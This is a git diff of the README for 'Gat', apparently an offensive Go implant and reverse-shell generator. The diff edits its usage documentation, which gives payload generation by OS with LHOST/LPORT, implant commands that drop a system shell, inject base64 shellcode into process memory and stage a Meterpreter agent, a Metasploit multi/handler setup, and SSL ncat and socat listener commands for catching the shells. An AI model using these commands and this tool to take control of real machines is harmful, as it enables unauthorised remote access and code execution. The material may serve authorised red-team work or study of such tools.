@@ -25,8 +25,16 @@ go get github.com/Binject/debug/pe
 go build Mangle.go
 ```
 ## Usage
+Gat will use 'MSF's Multi Handler' by default.(If listener selected)\
+Other options are available such as:
+
+*socat\
+*ncat
+
+These shells can be upgraded to meterpreter shells using the 'meterpreter' command in Gat.
 
 ##Gat.sh to make things easy.
+***WARNING*** Change CN 
 ```
 ./Gat.sh - Will show example and ascii art.
 ./Gat.sh [ Windows|Mac|Linux ] <LHOST> <LPORT> - Will generate given OS type payload.
@@ -39,20 +47,15 @@ The following special commands are supported:
 
 * ``shell`` : drops you an system shell (allowing you, for example, to change directories)
 * ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it
-* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https malleable agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
+* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https meterpreter agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
 * ``exit`` : exit gracefully
+
 
 ## Examples
 
 ### Basic usage
 
-One can use various tools to handle incomming connections, by default Gat will use 'MSF's Multi Handler' for default shell catcher.\
-These shells can be upgraded to meterpreter shells using the 'meterpreter' command in Gat.
 
-Other options are available to catch shells and upgrade to 'meterpreter' such as:
-
-*socat\
-*ncat
 
 ## Meterpreter staging
 **WARNING**: this currently only work for the Windows platform.
@@ -69,7 +72,7 @@ To use the meterpreter staging feature, just start your handler:
 ```bash
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set lhost 172.16.122.105
+set lhost 127.0.0.1
 set lport 8443
 set HandlerSSLCert ./server.pem
 exploit -j
@@ -105,23 +108,13 @@ Server username: LWS01\sconner
 ```
 Here is an example with `ncat`:
 
-```bash
-$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
-Ncat: Version 7.60 ( https://nmap.org/ncat )
-Ncat: Listening on :::1234
-Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 127.0.0.1.
-Ncat: Connection from 127.0.0.1:47814.
-[Gat]> whoami
-LWS01/sconner
+```
+ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
 ```
 
 'socat' example (tested with version `1.7.3.2`):
-```bash
-$ socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
-# connection would be initiated here
-[Gat]> whoami
-LWS01\sconner
+```
+socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
 ```
 
 ## Manually create GAT for more custom setup.
